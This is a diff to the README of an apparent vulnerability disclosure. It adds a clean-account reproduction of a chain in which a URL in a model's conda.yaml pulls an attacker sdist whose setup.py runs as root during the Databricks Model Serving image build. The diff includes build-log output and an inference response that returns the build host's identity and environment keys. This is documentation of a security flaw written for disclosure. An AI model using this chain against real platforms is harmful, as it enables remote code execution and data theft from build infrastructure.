@@ -67,6 +67,8 @@ cd poc && ./build.sh          # -> dist/zzbuildprobe-<version>.tar.gz
 | `DEEPDIVE_SUMMARY_1790860941.json` | **the build host**, via the GitHub API | Deeper probe: `/run/secrets/pip-docker-build-conf` is present in the sandbox (existence only — contents deliberately not read), plus build-tooling layout. |
 | `DEEPDIVE_SUMMARY_1790860950.json` | **the build host**, via the GitHub API | Same probe, later run: 92 concurrent `pip-metadata-*` directories in `/tmp`. |
 | `BUILD_HOST_ID_OUTPUT.txt` | **the researcher's own workstation** — a local dry run of the probe script, *before* the build | Proof the script works as written. **This is not build-host evidence** (`DESKTOP-RHD2N74`, `uid=197608(PC)`). Included for completeness. |
+| `BUILD_LOG_REPRO.txt` | **the build host**, 2026-10-05 | Clean-account reproduction: the build log for `hunt-ep` on `workspace.hunt.hunt_model` v1. |
+| `INVOCATION_REPRO.json` | **the serving container**, 2026-10-05 | The HTTP 200 inference response from that endpoint, carrying the build host's `EVIDENCE` back out. |
 | `app.py`, `app.yml`, `requirements.txt` | researcher | A separate probe against Databricks **Apps**, from a different report. Unrelated to the Model Serving chain above. |
 | `poc/build.sh` | researcher | Reproduces the published sdist. |
 | `poc/run_chain.py` | researcher | Drives the whole chain on a workspace you own: logs a model whose `conda.yaml` carries the URL, registers it, deploys an endpoint, invokes it, prints the evidence. |
@@ -94,6 +96,47 @@ python poc/run_chain.py --invoke-only   # just invoke whatever is deployed
 The script creates the schema and experiment if they are missing, prints the pip section
 of the registered version's `conda.yaml` so the URL can be confirmed in the registry, and
 writes the raw inference response to `INVOCATION_FINAL.json`.
+
+## Reproduced end to end on a clean account
+
+Re-run on 2026-10-05 against a workspace created for the purpose, holding no prior
+state — no schema, no experiment, no registered model, no endpoint:
+
+1. `mlflow.statsmodels.log_model(..., conda_env=conda_env(URL))` → registered
+   `workspace.hunt.hunt_model` v1, `status=READY`, no gate or warning.
+2. Reading the version's `conda.yaml` back **out of the registry** shows the URL on
+   line 1 of the pip block, alongside ordinary pins.
+3. Deploying it to the endpoint `hunt-ep` ran the image build. Its log
+   (`BUILD_LOG_REPRO.txt`) shows the internal mirror in force and the URL passing
+   through anyway:
+
+   ```
+   #14 0.038   - https://github.com/.../zzbuildprobe-1.2.0.tar.gz
+   #14 0.047 Configuring system-wide conda to use local channel only
+   #14 0.507 Using local channel file:///package-repo/conda-channel instead of conda-forge
+   #14 45.20 Collecting https://github.com/... (from -r /model/condaenv.97hrm4zt.requirements.txt (line 1))
+   #14 45.20   Preparing metadata (setup.py): started
+   #14 45.20 Building wheel for zzbuildprobe (setup.py): started
+   #14 45.20 Successfully installed ... zzbuildprobe-1.2.0
+   ```
+
+4. Invoking the endpoint returned HTTP 200 with the build host's identity
+   (`INVOCATION_REPRO.json`):
+
+   ```json
+   {"predictions": "{\"serving_host\": \"mlflow-server.host.local\",
+     \"build_evidence_file\": \"/opt/conda/envs/mlflow-env/lib/python3.12/site-packages/zzbuildprobe/build_evidence.py\",
+     \"EVIDENCE\": {\"host\": \"buildkitsandbox\",
+       \"uname\": \"Linux buildkitsandbox 6.1.177-224.371.amzn2023.x86_64 ...\",
+       \"id\": \"uid=0(root) gid=0(root) groups=0(root)\",
+       \"cwd\": \"/tmp/pip-req-build-6k6i874n\", \"home\": \"/root\",
+       \"envkeys\": [ ... \"IS_FEATURE_SERVING_CONTAINER\", \"MLFLOW_SERVING_WHEEL\",
+                     \"PIP_CONFIG_FILE\", \"USE_PRIVATE_PYTHON_REPO\" ...]}}"}
+   ```
+
+   `uid=0(root)` on `buildkitsandbox` was collected by the attacker-supplied `setup.py`
+   during the image build, shipped inside the wheel it built, and returned over HTTP by
+   the `predict` path reading it back out of `site-packages`.
 
 On a workspace with nothing in it, point `--model` at a catalog you have:
 
